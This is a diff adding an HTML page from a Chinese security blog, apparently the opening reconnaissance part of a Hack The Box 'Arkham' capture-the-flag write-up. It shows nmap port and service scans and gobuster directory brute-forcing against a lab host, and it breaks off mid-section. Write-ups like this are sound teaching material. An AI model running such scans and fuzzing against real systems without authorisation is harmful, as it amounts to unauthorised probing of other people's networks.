@@ -1,0 +1,1559 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/HTB/Windows-Arkham/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>信息搜集 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              信息搜集
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="_1">信息搜集<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.130 -oA scans/ports
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>...
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PORT      STATE SERVICE
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>80/tcp    open  http
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>135/tcp   open  msrpc
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>139/tcp   open  netbios-ssn
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>445/tcp   open  microsoft-ds
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>8080/tcp  open  http-proxy
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>49666/tcp open  unknown
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>49667/tcp open  unknown
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>...
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>root@kali# nmap -sT -sC -sV -O -p80,135,139,445,8080 10.10.10.11 -oA scans/details
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>...
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>PORT     STATE SERVICE       VERSION
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>80/tcp   open  http          Microsoft IIS httpd 10.0
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>| http-methods:
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>|_  Potentially risky methods: TRACE
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>|_http-server-header: Microsoft-IIS/10.0
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>|_http-title: IIS Windows Server
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>135/tcp  open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>445/tcp  open  microsoft-ds?
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>8080/tcp open  http          Apache Tomcat 8.5.37
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>| http-methods:
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>|_  Potentially risky methods: PUT DELETE
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>|_http-title: Mask Inc.
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>Host script results:
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>|_clock-skew: mean: -9m03s, deviation: 0s, median: -9m03s
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>| smb2-security-mode:
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>|   2.02:
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>|_    Message signing enabled but not required
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>| smb2-time:
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>|   date: 2019-03-16 15:09:28
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>|_  start_date: N/A
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>...
+</code></pre></div>
+<h2 id="website-tcp-80">Website - TCP 80<a class="headerlink" href="#website-tcp-80" title="Permanent link">&para;</a></h2>
+<p><img alt="截图" src="4833ba6b0d7ca85bd6612f37750a34d5.png" /></p>
+<p>为 IIS 默认界面</p>
+<h2 id="website-tcp-8080">Website - TCP 8080<a class="headerlink" href="#website-tcp-8080" title="Permanent link">&para;</a></h2>
+<p><img alt="截图" src="689880fe3fe2db2f2c2ed35de9cddb55.png" /></p>
+<p>页面显示这是一家名为 Mask 的公司，主要业务为数据保护。</p>
+<h2 id="fuzz">目录FUZZ<a class="headerlink" href="#fuzz" title="Permanent link">&para;</a></h2>
+<h3 id="tcp-80">TCP-80<a class="headerlink" href="#tcp-80" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>root@kali# gobuster -u http://10.10.10.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>...
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>2024/05/12 15:13:15 Starting gobuster
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>=====================================================
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>=====================================================
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>2024/05/12 15:17:01 Finished
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>...
+</code></pre></div>
+<p>没有扫描到什么有价值的目录</p>
+<h3 id="tcp-8080">TCP-8080<a class="headerlink" href="#tcp-8080" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>root@kali# gobuster -u http://10.10.10.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>...
